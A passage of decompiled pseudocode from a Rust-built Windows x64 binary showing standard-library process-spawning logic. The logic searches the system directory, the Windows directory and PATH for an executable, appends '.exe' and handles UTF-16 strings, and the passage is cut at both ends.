2) >= 7 )\n              {\n                do\n                {\n                  v50 = *(_QWORD *)(v46 + 8i64 * *(unsigned __int16 *)(v46 + 978) + 984);\n                  v51 = *(_QWORD *)(v50 + 8i64 * *(unsigned __int16 *)(v50 + 978) + 984);\n                  v52 = *(_QWORD *)(v51 + 8i64 * *(unsigned __int16 *)(v51 + 978) + 984);\n                  v53 = *(_QWORD *)(v52 + 8i64 * *(unsigned __int16 *)(v52 + 978) + 984);\n                  v54 = *(_QWORD *)(v53 + 8i64 * *(unsigned __int16 *)(v53 + 978) + 984);\n                  v55 = *(_QWORD *)(v54 + 8i64 * *(unsigned __int16 *)(v54 + 978) + 984);\n                  v56 = *(_QWORD *)(v55 + 8i64 * *(unsigned __int16 *)(v55 + 978) + 984);\n                  v46 = *(_QWORD *)(v56 + 8i64 * *(unsigned __int16 *)(v56 + 978) + 984);\n                  v47 -= 8i64;\n                }\n                while ( v47 );\n              }\n            }\n            v57 = *(unsigned __int16 *)(v46 + 978) - 1i64;\n            *(_OWORD *)v332.m256i_i8 = v46;\n            v332.m256i_i64[2] = v57;\n            sub_140041240((__int64)&lpString1, &v332, lpApplicationName);\n            *(_QWORD *)&v326[32] = lpString1.hStdInput;\n            *(_OWORD *)&v326[16] = *(_OWORD *)&lpString1.wShowWindow;\n            v58 = _mm_loadu_si128((const __m128i *)&lpString1);\n            *(_OWORD *)v326 = *(_OWORD *)&lpString1.dwXCountChars;\n            v325 = *(_OWORD *)&lpString1.dwX;\n            *(_OWORD *)&v324.m256i_u64[2] = *(_OWORD *)&lpString1.lpDesktop;\n            *(__m128i *)v324.m256i_i8 = v58;\n            hStdOutput = lpString1.hStdOutput;\n            v60 = v309;\n            if ( v309 >= *((unsigned __int16 *)lpString1.hStdOutput + 489) )\n            {\n              hStdError = (char *)lpString1.hStdError;\n              while ( 1 )\n              {\n                v61 = (_WORD *)hStdOutput[44];\n                if ( !v61 )\n                  break;\n                v60 = *((unsigned __int16 *)hStdOutput + 488);\n                ++hStdError;\n                hStdOutput = (_QWORD *)hStdOutput[44];\n                if ( (unsigned __int16)v60 < v61[489] )\n                  goto LABEL_94;\n              }\n              v60 = (unsigned __int64)hStdError;\n              v61 = 0i64;\n            }\n            else\n            {\n              v61 = lpString1.hStdOutput;\n            }\nLABEL_94:\n            v67 = 28 * v60;\n            v68 = 16 * v60;\n            *(_QWORD *)v336 = *(_QWORD *)&v61[v67 + 204];\n            v69 = *(_OWORD *)&v61[v67 + 180];\n            v70 = *(_OWORD *)&v61[v67 + 188];\n            *(_OWORD *)v335 = *(_OWORD *)&v61[v67 + 196];\n            *(_OWORD *)&v334.m256i_u64[2] = v70;\n            *(_OWORD *)v334.m256i_i8 = v69;\n            *(_QWORD *)&v61[v67 + 204] = *(_QWORD *)v326;\n            v71 = *(_OWORD *)v324.m256i_i8;\n            v72 = *(_OWORD *)&v324.m256i_u64[2];\n            *(_OWORD *)&v61[v67 + 196] = v325;\n            *(_OWORD *)&v61[v67 + 188] = v72;\n            *(_OWORD *)&v61[v67 + 180] = v71;\n            v73 = *(_OWORD *)&v61[v68];\n            *(_OWORD *)&v336[24] = *(_OWORD *)&v61[v68 + 8];\n            *(_OWORD *)&v336[8] = v73;\n            v74 = *(_OWORD *)&v326[24];\n            *(_OWORD *)&v61[v68] = *(_OWORD *)&v326[8];\n            *(_OWORD *)&v61[v68 + 8] = v74;\n            lpString1.hStdInput = *(HANDLE *)&v336[32];\n            *(_OWORD *)&lpString1.wShowWindow = *(_OWORD *)&v336[16];\n            si128 = _mm_load_si128((const __m128i *)&v334);\n            *(_OWORD *)&lpString1.dwXCountChars = *(_OWORD *)v336;\n            *(_OWORD *)&lpString1.dwX = *(_OWORD *)v335;\n            *(_OWORD *)&lpString1.lpDesktop = *(_OWORD *)&v334.m256i_u64[2];\n            *(__m128i *)&lpString1.cb = si128;\n          }\n          else\n          {\n            *(_OWORD *)v334.m256i_i8 = ProcessInformation.m128i_u64[1];\n            v334.m256i_i64[2] = *((_QWORD *)&ProcessInformation_16 + 1);\n            sub_140041240((__int64)&lpString1, &v334, lpApplicationName);\n          }\n          *(_QWORD *)&v336[32] = lpString1.hStdInput;\n          *(_OWORD *)&v336[16] = *(_OWORD *)&lpString1.wShowWindow;\n          v76 = _mm_load_si128((const __m128i *)&lpString1);\n          *(_OWORD *)v336 = *(_OWORD *)&lpString1.dwXCountChars;\n          *(_OWORD *)v335 = *(_OWORD *)&lpString1.dwX;\n          --v321;\n          *(_OWORD *)&v334.m256i_u64[2] = *(_OWORD *)&lpString1.lpDesktop;\n          *(__m128i *)v334.m256i_i8 = v76;\n          if ( LOBYTE(lpApplicationName[0]) )\n          {\n            if ( !v33 )\n              sub_14005CEC0((__int64)\"assertion failed: self.height > 0\", 33i64, (__int64)&off_140069308);\n            lpCommandLine[0] = *(LPWSTR *)(lpDesktop + 984);\n            lpCommandLine[1] = (LPWSTR)((char *)v33 - 1);\n            *((_QWORD *)lpCommandLine[0] + 44) = 0i64;\n            sub_140006340((void *)lpDesktop, 8ui64);\n          }\n          v16 = 0i64;\n          v17 = v30;\n          if ( v336[32] != 2 )\n          {\n            lpDesktop = v18;\n            v77 = *(_OWORD *)v334.m256i_i8;\n            Src = *(void **)&v336[8];\n            v78 = *(_QWORD *)&v336[16];\n            if ( v335[0] )\n            {\n              sub_140006340((void *)v334.m256i_i64[3], 1ui64);\n              v17 = v30;\n            }\n            if ( *((_QWORD *)&v77 + 1) )\n            {\n              sub_140006340((void *)v77, 2ui64);\n              v17 = v30;\n            }\n            v16 = 0i64;\n            v13 = v78 == 0;\n            v18 = lpDesktop;\n            v3 = v333;\n            if ( !v13 )\n            {\n              sub_140006340(Src, 1ui64);\n              v17 = v30;\n              v16 = 0i64;\n            }\n          }\n        }\n      }\n    }\n    else\n    {\n      Src = v4;\n      v34 = *(const void **)(v28 + 24);\n      v35 = *(_QWORD *)(v28 + 40);\n      penv = (LPWCH)v18;\n      v341 = v17;\n      if ( v35 )\n      {\n        if ( v35 < 0 )\n          sub_140006390();\n        v36 = (__int64)sub_1400062B0(v35, 1ui64);\n        if ( !v36 )\n          sub_14005CBB0(1i64, v35);\n      }\n      else\n      {\n        v36 = 1i64;\n      }\n      memmove((void *)v36, v34, v35);\n      v37 = *(_BYTE *)(v28 + 48);\n      v334.m256i_i64[0] = v36;\n      v334.m256i_i64[1] = v35;\n      v334.m256i_i64[2] = v35;\n      v334.m256i_i8[24] = v37;\n      v38 = *(const WCHAR **)v28;\n      v39 = *(WCHAR **)(v28 + 16);\n      if ( v39 )\n      {\n        v40 = 0i64;\n        if ( (unsigned __int64)v39 >> 62 )\n          sub_140006390();\n        v41 = 2i64 * (_QWORD)v39;\n        LOBYTE(v40) = (unsigned __int64)v39 >> 62 == 0;\n        v42 = 2 * v40;\n        if ( 2i64 * (_QWORD)v39 )\n        {\n          v43 = v38;\n          v44 = sub_1400062B0(2i64 * (_QWORD)v39, v42);\n          v38 = v43;\n          v45 = (__int64)v44;\n          if ( !v44 )\n            goto LABEL_599;\n        }\n        else\n        {\n          v45 = v42;\n          if ( !v42 )\nLABEL_599:\n            sub_14005CBB0(v42, 2i64 * (_QWORD)v39);\n        }\n      }\n      else\n      {\n        v45 = 2i64;\n        v41 = 0i64;\n      }\n      v62 = v29 + v22;\n      memmove((void *)v45, v38, v41);\n      *(__m128i *)&lpString1.lpTitle = _mm_loadu_si128((const __m128i *)&v334);\n      *(_OWORD *)&lpString1.dwXSize = *(_OWORD *)&v334.m256i_u64[2];\n      *(_QWORD *)&lpString1.cb = v45;\n      lpString1.lpReserved = v39;\n      lpString1.lpDesktop = v39;\n      v63 = *(const void **)v62;\n      lpDesktop = *(_QWORD *)(v62 + 16);\n      if ( lpDesktop )\n      {\n        if ( (lpDesktop & 0x8000000000000000ui64) != 0i64 )\n        {\n          v342 = 1;\n          sub_140006390();\n        }\n        v64 = (__int64)sub_1400062B0(*(_QWORD *)(v62 + 16), 1ui64);\n        if ( !v64 )\n        {\n          v342 = 1;\n          sub_14005CBB0(1i64, lpDesktop);\n        }\n      }\n      else\n      {\n        v64 = 1i64;\n      }\n      memmove((void *)v64, v63, lpDesktop);\n      v65 = *(_BYTE *)(v62 + 24);\n      v334.m256i_i64[0] = v64;\n      v334.m256i_i64[1] = lpDesktop;\n      v334.m256i_i64[2] = lpDesktop;\n      v334.m256i_i8[24] = v65;\n      v342 = 0;\n      sub_14003F910((__int64)&v324, (__int64 *)lpCommandLine, &lpString1, &v334);\n      v3 = v333;\n      v4 = (char *)Src;\n      v18 = (unsigned __int64)penv;\n      if ( v324.m256i_i8[24] != 2 && v324.m256i_i64[1] )\n        sub_140006340((void *)v324.m256i_i64[0], 1ui64);\n      v16 = 0i64;\n      v17 = v341;\n    }\n  }\n  v312 = _mm_loadu_si128((const __m128i *)lpCommandLine);\n  v313 = v321;\n  v311 = 1i64;\n  v79 = sub_1400062B0(4ui64, 1ui64);\n  if ( !v79 )\n  {\n    v347 = 1;\n    sub_14005CBB0(1i64, 4i64);\n  }\n  *(_DWORD *)v79 = 1213481296;\n  v334.m256i_i64[0] = (__int64)v79;\n  v334.m256i_i64[1] = 4i64;\n  v334.m256i_i64[2] = 4i64;\n  v334.m256i_i8[24] = 0;\n  *(_QWORD *)&lpString1.cb = v79;\n  lpString1.lpReserved = (LPWSTR)(v79 + 4);\n  LOWORD(lpString1.lpDesktop) = 0;\n  sub_14003F6F0((__int64)&v324, (char **)&lpString1);\n  *(__m256i *)&lpString1.lpTitle = v334;\n  v80 = _mm_loadu_si128((const __m128i *)&v324);\n  *(__m128i *)&lpString1.cb = v80;\n  v81 = v324.m256i_i32[4];\n  lpString1.lpDesktop = (LPWSTR)v324.m256i_i64[2];\n  v82 = (unsigned __int16 *)v312.m128i_i64[0];\n  if ( v312.m128i_i64[0] )\n  {\n    penv = (LPWCH)v312.m128i_i64[1];\n    while ( 2 )\n    {\n      v83 = v82 + 180;\n      v341 = v82[489];\n      v84 = 56 * v341;\n      Src = v82;\n      v85 = (unsigned __int64 *)(v82 - 8);\n      lpDesktop = -1i64;\n      do\n      {\n        if ( !v84 )\n        {\n          lpDesktop = v341;\n          goto LABEL_114;\n        }\n        v86 = v83 + 28;\n        v87 = CompareStringOrdinal((LPCWCH)v80.m128i_i64[0], v81, *(LPCWCH *)v83, *((_DWORD *)v83 + 4), 1);\n        v84 -= 56i64;\n        v85 += 4;\n        ++lpDesktop;\n        v83 = v86;\n      }\n      while ( v87 == 3 );\n      if ( v87 != 1 )\n      {\n        if ( v87 != 2 )\n        {\n          LODWORD(v305) = GetLastError();\n          ProcessInformation.m128i_i64[0] = (v305 << 32) | 2;\n          v324.m256i_i64[0] = (__int64)&ProcessInformation;\n          v324.m256i_i64[1] = (__int64)sub_140032000;\n          v334.m256i_i64[0] = (__int64)&off_14006B5E0;\n          v334.m256i_i64[1] = 1i64;\n          v335[0] = 0i64;\n          v334.m256i_i64[2] = (__int64)&v324;\n          v334.m256i_i64[3] = 1i64;\n          sub_14005CD00((__int64)&v334, (__int64)&off_14006B618);\n        }\n        if ( Src )\n        {\n          v6 = *(v85 - 2);\n          lpDesktop = *v85;\n        }\n        else\n        {\n          v6 = 0i64;\n        }\n        v3 = v333;\n        if ( !*(_QWORD *)&lpString1.dwX )\n          goto LABEL_124;\n        goto LABEL_123;\n      }\nLABEL_114:\n      if ( penv )\n      {\n        penv = (LPWCH)((char *)penv - 1);\n        v82 = (unsigned __int16 *)*((_QWORD *)Src + lpDesktop + 123);\n        continue;\n      }\n      break;\n    }\n    v3 = v333;\n    v6 = 0i64;\n    if ( *(_QWORD *)&lpString1.dwX )\n      goto LABEL_123;\n  }\n  else\n  {\n    v6 = 0i64;\n    if ( *(_QWORD *)&lpString1.dwX )\nLABEL_123:\n      sub_140006340(lpString1.lpTitle, 1ui64);\n  }\nLABEL_124:\n  if ( lpString1.lpReserved )\n    sub_140006340((void *)v80.m128i_i64[0], 2ui64);\nLABEL_126:\n  v88 = (WCHAR *)v3[8];\n  v89 = &off_14006B688;\n  if ( !v88 )\n    goto LABEL_132;\n  v90 = (_DWORD *)v3[6];\n  penv = (LPWCH)&v312;\n  if ( (unsigned __int64)v88 >= 4 )\n  {\n    v91 = sub_140041980;\n    if ( *v90 == 1547656284 )\n      v91 = sub_140041970;\n  }\n  else\n  {\n    v91 = sub_140041980;\n  }\n  Src = v90;\n  v92 = *((_BYTE *)v90 + (_QWORD)v88 - 1);\n  v347 = 1;\n  if ( v91(v92) )\n    goto LABEL_132;\n  if ( (unsigned __int64)v88 < 4 )\n  {\n    v97 = 0;\n    v96 = (char *)Src;\n  }\n  else\n  {\n    v96 = (char *)Src;\n    v97 = (*((_BYTE *)Src + (_QWORD)v88 - 4) | (unsigned __int8)(32\n                                                               * ((unsigned __int8)(*((_BYTE *)Src + (_QWORD)v88 - 4)\n                                                                                  - 65) < 0x1Au))) == 46\n       && (*((_BYTE *)v88 + (_QWORD)Src - 3) | (unsigned __int8)(32\n                                                               * ((unsigned __int8)(*((_BYTE *)v88 + (_QWORD)Src - 3)\n                                                                                  - 65) < 0x1Au))) == 101\n       && (*((_BYTE *)v88 + (_QWORD)Src - 2) | (unsigned __int8)(32\n                                                               * ((unsigned __int8)(*((_BYTE *)v88 + (_QWORD)Src - 2)\n                                                                                  - 65) < 0x1Au))) == 120\n       && ((unsigned __int8)v92 | (unsigned __int8)(32 * ((unsigned __int8)(v92 - 65) < 0x1Au))) == 101;\n  }\n  v98 = 0i64;\n  while ( v88 != v98 )\n  {\n    v99 = *((unsigned __int8 *)v98 + (_QWORD)v96);\n    if ( v99 != 47 )\n    {\n      v98 = (WCHAR *)((char *)v98 + 1);\n      if ( v99 != 92 )\n        continue;\n    }\n    v322 = (__int64)v88 + (_QWORD)v96;\n    if ( v97 )\n    {\n      v347 = 1;\n      sub_14002DD80((__int64)&lpString1, v96, (__int64)v88);\n      if ( *(_QWORD *)&lpString1.cb )\n      {\n        v347 = 1;\n        sub_140041990((__int64)&v319, &lpString1);\n      }\n      else\n      {\n        *(_OWORD *)v319.m256i_i8 = __PAIR128__((unsigned __int64)lpString1.lpReserved, 0i64);\n      }\n    }\n    else\n    {\n      v108 = 0i64;\n      if ( (__int64)v88 < 0 )\n      {\n        v347 = 1;\n        sub_140006390();\n      }\n      LOBYTE(v108) = 1;\n      v109 = sub_1400062B0((SIZE_T)v88, v108);\n      if ( !v109 )\n      {\n        v347 = 1;\n        sub_14005CBB0(v108, (__int64)v88);\n      }\n      v110 = (__int64)v109;\n      memmove(v109, v96, (size_t)v88);\n      v334.m256i_i64[0] = v110;\n      v334.m256i_i64[1] = (__int64)v88;\n      v334.m256i_i64[2] = (__int64)v88;\n      v334.m256i_i8[24] = 0;\n      lpString1.lpDesktop = v88;\n      LOBYTE(lpString1.lpTitle) = 0;\n      *(_DWORD *)((char *)&lpString1.lpTitle + 1) = *(__int32 *)((char *)&v334.m256i_i32[6] + 1);\n      *(_WORD *)((char *)&lpString1.lpTitle + 5) = *(__int16 *)((char *)&v334.m256i_i16[14] + 1);\n      HIBYTE(lpString1.lpTitle) = v334.m256i_i8[31];\n      *(_QWORD *)&lpString1.cb = v110;\n      lpString1.lpReserved = v88;\n      sub_140034530((__int64)&lpString1, \".exeprogram not found\", 4ui64);\n      v111 = _mm_load_si128((const __m128i *)&lpString1);\n      *(_OWORD *)&v334.m256i_u64[2] = *(_OWORD *)&lpString1.lpDesktop;\n      *(__m128i *)v334.m256i_i8 = v111;\n      lpDesktop = (unsigned __int64)lpString1.lpDesktop;\n      v339 = 1;\n      sub_140041AA0((__int64)&v324, (char *)v111.m128i_i64[0], (__int64)lpString1.lpDesktop);\n      if ( v324.m256i_i64[0] )\n      {\n        v319.m256i_i64[2] = v324.m256i_i64[2];\n        *(__m128i *)v319.m256i_i8 = _mm_loadu_si128((const __m128i *)&v324);\n      }\n      else\n      {\n        v112 = (_WORD *)sub_140039CD0((unsigned __int8 *)v111.m128i_i64[0], lpDesktop);\n        if ( v112 )\n        {\n          if ( v113 != 2 || (v114 = 2i64, *v112 != 11822) )\n          {\n            v115 = v113;\n            while ( v115 )\n            {\n              v116 = v115--;\n              if ( *((_BYTE *)v112 + v116 - 1) == 46 )\n              {\n                if ( v113 < v116 )\n                  sub_14005CDC0(v116, v113, (__int64)&off_140068B80);\n                if ( v115 )\n                  v113 = v115;\n                break;\n              }\n            }\n            v114 = v113;\n          }\n          v117 = (unsigned __int64)v112 + v114 - v111.m128i_i64[0];\n          if ( lpDesktop >= v117 )\n          {\n            v334.m256i_i64[2] = v117;\n            lpDesktop = v117;\n          }\n        }\n        sub_14002DD80((__int64)&lpString1, (char *)v111.m128i_i64[0], lpDesktop);\n        if ( *(_QWORD *)&lpString1.cb )\n          sub_140041990((__int64)&v319, &lpString1);\n        else\n          *(_OWORD *)v319.m256i_i8 = __PAIR128__((unsigned __int64)lpString1.lpReserved, 0i64);\n      }\n      if ( v334.m256i_i64[1] )\n        sub_140006340((void *)v111.m128i_i64[0], 1ui64);\n    }\n    v89 = (char **)v319.m256i_i64[1];\n    v127 = v319.m256i_i64[0];\n    if ( v319.m256i_i64[0] )\n    {\n      v137 = v319.m256i_u64[2];\n      v124 = Src;\n      goto LABEL_229;\n    }\nLABEL_132:\n    v93 = v328;\n    *(_QWORD *)v328 = v89;\n    *(_QWORD *)(v93 + 16) = 2i64;\n    if ( (_BYTE)v327 )\n      return;\n    goto LABEL_133;\n  }\n  v100 = 0;\n  v89 = &off_14006B650;\n  v101 = v96;\n  while ( 2 )\n  {\n    v102 = 1;\n    if ( v100 )\n    {\n      v100 = 0;\n      goto LABEL_154;\n    }\n    if ( v101 != (char *)v88 + (_QWORD)v96 )\n    {\n      LOWORD(v103) = (unsigned __int8)*v101;\n      if ( *v101 >= 0 )\n      {\n        ++v101;\n        goto LABEL_164;\n      }\n      v104 = v103 & 0x1F;\n      v105 = v101[1] & 0x3F;\n      if ( (unsigned __int8)v103 <= 0xDFu )\n      {\n        v101 += 2;\n        LOWORD(v103) = v105 | ((_WORD)v104 << 6);\n      }\n      else\n      {\n        v106 = (v105 << 6) | v101[2] & 0x3F;\n        if ( (unsigned __int8)*v101 < 0xF0u )\n        {\n          v101 += 3;\n          v103 = (v104 << 12) | v106;\n          if ( v103 > 0xFFFF )\n            goto LABEL_166;\n        }\n        else\n        {\n          v107 = v101[3];\n          v101 += 4;\n          v103 = ((v104 & 7) << 18) | (v106 << 6) | v107 & 0x3F;\n          if ( v103 > 0xFFFF )\n          {\nLABEL_166:\n            v100 = v103 & 0x3FF | 0xDC00;\nLABEL_154:\n            if ( !v102 )\n              goto LABEL_132;\n            continue;\n          }\n        }\n      }\nLABEL_164:\n      v100 = 0;\n      v102 = v103;\n      goto LABEL_154;\n    }\n    break;\n  }\n  if ( (unsigned __int64)v88 > 0xF )\n  {\n    v119 = sub_14000AAA0(0x2Eu, (__int64)v96, (unsigned __int64)v88) == 1;\n  }\n  else\n  {\n    v118 = 0i64;\n    do\n    {\n      v119 = *((_BYTE *)v118 + (_QWORD)v96) == 46;\n      if ( *((_BYTE *)v118 + (_QWORD)v96) == 46 )\n        break;\n      v13 = (WCHAR *)((char *)v88 - 1) == v118;\n      v118 = (WCHAR *)((char *)v118 + 1);\n    }\n    while ( !v13 );\n  }\n  LOBYTE(lpCurrentDirectory) = v119;\n  v322 = (__int64)v88 + (_QWORD)v96;\n  if ( v6 )\n  {\n    lpDesktop += v6;\n    v324.m256i_i64[0] = v6;\n    v324.m256i_i64[1] = lpDesktop;\n    v324.m256i_i16[8] = 0;\n    v324.m256i_i8[24] = 1;\n    v347 = 1;\n    sub_1400330F0((__int64)&lpString1, (char **)&v324);\n    lpTitle = (__int8)lpString1.lpTitle;\n    if ( LOBYTE(lpString1.lpTitle) != 2 )\n    {\n      lpDesktop = (unsigned __int64)&v324;\n      do\n      {\n        if ( !lpString1.lpDesktop )\n        {\n          if ( lpString1.lpReserved )\n            sub_140006340(*(void **)&lpString1.cb, 1ui64);\n          v347 = 1;\n          JUMPOUT(0x14003CF37i64);\n        }\n        v334.m256i_i32[7] = HIDWORD(lpString1.lpTitle);\n        *(__int32 *)((char *)&v334.m256i_i32[6] + 1) = *(_DWORD *)((char *)&lpString1.lpTitle + 1);\n        *(_OWORD *)v334.m256i_i8 = *(_OWORD *)&lpString1.cb;\n        v334.m256i_i64[2] = (__int64)lpString1.lpDesktop;\n        v334.m256i_i8[24] = lpTitle;\n        sub_140035D40((__int64)&v334, (unsigned __int8 *)Src, (unsigned __int64)v88);\n        if ( !(_BYTE)lpCurrentDirectory )\n          sub_140039E30((__int64)&v334, \"exeNUL\\\\cmd.exefallback RNG broken: \", 3ui64);\n        v202 = (void *)v334.m256i_i64[0];\n        sub_140041AA0((__int64)&lpString1, (char *)v334.m256i_i64[0], v334.m256i_i64[2]);\n        if ( v334.m256i_i64[1] )\n          sub_140006340(v202, 1ui64);\n        v127 = *(_QWORD *)&lpString1.cb;\n        if ( *(_QWORD *)&lpString1.cb )\n        {\n          v128 = *(__m128i *)&lpString1.lpReserved;\n          goto LABEL_409;\n        }\n        v347 = 1;\n        sub_1400330F0((__int64)&lpString1, (char **)&v324);\n        lpTitle = (__int8)lpString1.lpTitle;\n      }\n      while ( LOBYTE(lpString1.lpTitle) != 2 );\n    }\n  }\n  v347 = 1;\n  sub_1400338C0((__int64)&v324);\n  if ( v324.m256i_i8[24] == 2 )\n  {\n    v347 = 1;\n    sub_14002B4A0(v324.m256i_i64);\n  }\n  else\n  {\n    *(__m128i *)v334.m256i_i8 = _mm_loadu_si128((const __m128i *)&v324);\n    *(_OWORD *)&v334.m256i_u64[2] = *(_OWORD *)&v324.m256i_u64[2];\n    v121 = v324.m256i_u64[2];\n    v338 = 1;\n    v122 = sub_140037260((unsigned __int8 *)v334.m256i_i64[0], v324.m256i_u64[2]);\n    v124 = Src;\n    if ( v122 && v121 >= v123 )\n      v334.m256i_i64[2] = v123;\n    v125 = _mm_load_si128((const __m128i *)&v334);\n    *(_OWORD *)&lpString1.lpDesktop = *(_OWORD *)&v334.m256i_u64[2];\n    *(__m128i *)&lpString1.cb = v125;\n    sub_140035D40((__int64)&lpString1, (unsigned __int8 *)Src, (unsigned __int64)v88);\n    if ( !(_BYTE)lpCurrentDirectory )\n      sub_140039E30((__int64)&lpString1, \"exeNUL\\\\cmd.exefallback RNG broken: \", 3ui64);\n    v126 = *(void **)&lpString1.cb;\n    sub_140041AA0((__int64)&ProcessInformation, *(char **)&lpString1.cb, (__int64)lpString1.lpDesktop);\n    if ( lpString1.lpReserved )\n      sub_140006340(v126, 1ui64);\n    v127 = ProcessInformation.m128i_i64[0];\n    if ( ProcessInformation.m128i_i64[0] )\n    {\n      v128 = _mm_loadu_si128((const __m128i *)&ProcessInformation.m128i_i8[8]);\n      goto LABEL_410;\n    }\n  }\n  v332.m256i_i64[0] = 2i64;\n  *(_OWORD *)&v332.m256i_u64[1] = 0i64;\n  v129 = 512i64;\n  v331 = 2i64;\n  v341 = 0i64;\n  v130 = 0i64;\n  v131 = 0i64;\n  while ( 2 )\n  {\n    while ( 2 )\n    {\n      p_lpString1 = (WCHAR *)&lpString1;\n      lpDesktop = 512i64;\n      v133 = v129;\nLABEL_216:\n      SetLastError(0);\n      SystemDirectoryW = GetSystemDirectoryW(p_lpString1, v133);\n      if ( !SystemDirectoryW && GetLastError() )\n      {\n        LODWORD(v212) = GetLastError();\n        v324.m256i_i64[1] = (v212 << 32) | 2;\n        v324.m256i_i64[0] = 1i64;\n        v167 = 0;\n        goto LABEL_373;\n      }\n      v129 = SystemDirectoryW;\n      if ( v133 == SystemDirectoryW )\n      {\n        if ( GetLastError() != 122 )\n          sub_14005CEC0((__int64)&unk_14006C9D0, 40i64, (__int64)&off_14006BC38);\n        v136 = 2 * v133;\n        if ( v136 >= 0xFFFFFFFF )\n          v136 = 0xFFFFFFFFi64;\n        v129 = v136;\n        if ( v136 < 0x201 )\n          continue;\n        goto LABEL_211;\n      }\n      break;\n    }\n    if ( v133 < SystemDirectoryW )\n    {\n      if ( SystemDirectoryW < 0x201ui64 )\n        continue;\nLABEL_211:\n      v134 = v129 - v131;\n      if ( v130 - v131 < v134 )\n      {\n        sub_14005DCD0(v332.m256i_i64, v131, v134);\n        v341 = v332.m256i_u64[1];\n        v331 = v332.m256i_i64[0];\n      }\n      v130 = v341;\n      v131 = 0xFFFFFFFFi64;\n      if ( v341 < 0xFFFFFFFF )\n        v131 = v341;\n      v332.m256i_i64[2] = v131;\n      p_lpString1 = (WCHAR *)v331;\n      lpDesktop = v131;\n      v133 = v131;\n      goto LABEL_216;\n    }\n    break;\n  }\n  if ( lpDesktop < SystemDirectoryW )\n    sub_14005CE40(SystemDirectoryW, lpDesktop, (__int64)&off_14006BC50);\n  sub_14002F8C0((__int128 *)v334.m256i_i8, p_lpString1, SystemDirectoryW);\n  sub_140035D40((__int64)&v334, (unsigned __int8 *)Src, (unsigned __int64)v88);\n  if ( !(_BYTE)lpCurrentDirectory )\n    sub_140039E30((__int64)&v334, \"exeNUL\\\\cmd.exefallback RNG broken: \", 3ui64);\n  lpDesktop = v334.m256i_i64[0];\n  sub_140041AA0((__int64)&ProcessInformation, (char *)v334.m256i_i64[0], v334.m256i_i64[2]);\n  if ( v334.m256i_i64[1] )\n    sub_140006340((void *)lpDesktop, 1ui64);\n  *(__m128i *)&v324.m256i_u64[1] = _mm_loadu_si128(&ProcessInformation);\n  v324.m256i_i64[3] = ProcessInformation_16;\n  v324.m256i_i64[0] = 0i64;\n  v167 = 1;\nLABEL_373:\n  if ( v341 )\n    sub_140006340((void *)v331, 2ui64);\n  if ( v167 )\n  {\n    v127 = v324.m256i_i64[1];\n    if ( v324.m256i_i64[1] )\n    {\nLABEL_408:\n      v128 = _mm_loadu_si128((const __m128i *)&v324.m256i_u64[2]);\n      goto LABEL_409;\n    }\n  }\n  else\n  {\n    v347 = 1;\n    sub_14002B4A0(&v324.m256i_i64[1]);\n  }\n  v332.m256i_i64[0] = 2i64;\n  *(_OWORD *)&v332.m256i_u64[1] = 0i64;\n  v213 = 512i64;\n  v331 = 2i64;\n  v341 = 0i64;\n  v214 = 0i64;\n  v215 = 0i64;\n  while ( 2 )\n  {\n    while ( 2 )\n    {\n      v216 = (WCHAR *)&lpString1;\n      lpDesktop = 512i64;\n      v217 = v213;\nLABEL_388:\n      SetLastError(0);\n      WindowsDirectoryW = GetWindowsDirectoryW(v216, v217);\n      if ( !WindowsDirectoryW && GetLastError() )\n      {\n        LODWORD(v223) = GetLastError();\n        v324.m256i_i64[1] = (v223 << 32) | 2;\n        v324.m256i_i64[0] = 1i64;\n        v221 = 0;\n        goto LABEL_404;\n      }\n      v213 = WindowsDirectoryW;\n      if ( v217 == WindowsDirectoryW )\n      {\n        if ( GetLastError() != 122 )\n          sub_14005CEC0((__int64)&unk_14006C9D0, 40i64, (__int64)&off_14006BC38);\n        v220 = 2 * v217;\n        if ( v220 >= 0xFFFFFFFF )\n          v220 = 0xFFFFFFFFi64;\n        v213 = v220;\n        if ( v220 < 0x201 )\n          continue;\n        goto LABEL_383;\n      }\n      break;\n    }\n    if ( v217 < WindowsDirectoryW )\n    {\n      if ( WindowsDirectoryW < 0x201ui64 )\n        continue;\nLABEL_383:\n      v218 = v213 - v215;\n      if ( v214 - v215 < v218 )\n      {\n        sub_14005DCD0(v332.m256i_i64, v215, v218);\n        v341 = v332.m256i_u64[1];\n        v331 = v332.m256i_i64[0];\n      }\n      v214 = v341;\n      v215 = 0xFFFFFFFFi64;\n      if ( v341 < 0xFFFFFFFF )\n        v215 = v341;\n      v332.m256i_i64[2] = v215;\n      v216 = (WCHAR *)v331;\n      lpDesktop = v215;\n      v217 = v215;\n      goto LABEL_388;\n    }\n    break;\n  }\n  if ( lpDesktop < WindowsDirectoryW )\n    sub_14005CE40(WindowsDirectoryW, lpDesktop, (__int64)&off_14006BC50);\n  sub_14002F8C0((__int128 *)v334.m256i_i8, v216, WindowsDirectoryW);\n  sub_140035D40((__int64)&v334, (unsigned __int8 *)Src, (unsigned __int64)v88);\n  if ( !(_BYTE)lpCurrentDirectory )\n    sub_140039E30((__int64)&v334, \"exeNUL\\\\cmd.exefallback RNG broken: \", 3ui64);\n  lpDesktop = v334.m256i_i64[0];\n  sub_140041AA0((__int64)&ProcessInformation, (char *)v334.m256i_i64[0], v334.m256i_i64[2]);\n  if ( v334.m256i_i64[1] )\n    sub_140006340((void *)lpDesktop, 1ui64);\n  *(__m128i *)&v324.m256i_u64[1] = _mm_loadu_si128(&ProcessInformation);\n  v324.m256i_i64[3] = ProcessInformation_16;\n  v324.m256i_i64[0] = 0i64;\n  v221 = 1;\nLABEL_404:\n  if ( v341 )\n    sub_140006340((void *)v331, 2ui64);\n  if ( v221 )\n  {\n    v127 = v324.m256i_i64[1];\n    if ( v324.m256i_i64[1] )\n      goto LABEL_408;\n  }\n  else\n  {\n    v347 = 1;\n    sub_14002B4A0(&v324.m256i_i64[1]);\n  }\n  v347 = 1;\n  sub_1400313F0((__int64)&v332, \"PATHlibrary\\\\std\\\\src\\\\sys_common\\\\process.rs\", 4i64);\n  if ( v332.m256i_i8[24] == 2 )\n  {\nLABEL_432:\n    v89 = (char **)&off_14006B6B8;\n    goto LABEL_132;\n  }\n  v224 = _mm_loadu_si128((const __m128i *)&v332);\n  ProcessInformation = v224;\n  ProcessInformation_16 = *(_OWORD *)&v332.m256i_u64[2];\n  v324.m256i_i64[0] = v224.m128i_i64[0];\n  v324.m256i_i64[1] = v224.m128i_i64[0] + v332.m256i_i64[2];\n  v324.m256i_i16[8] = 0;\n  v324.m256i_i8[24] = 1;\n  lpDesktop = (unsigned __int64)&lpString1;\n  do\n  {\n    while ( 1 )\n    {\n      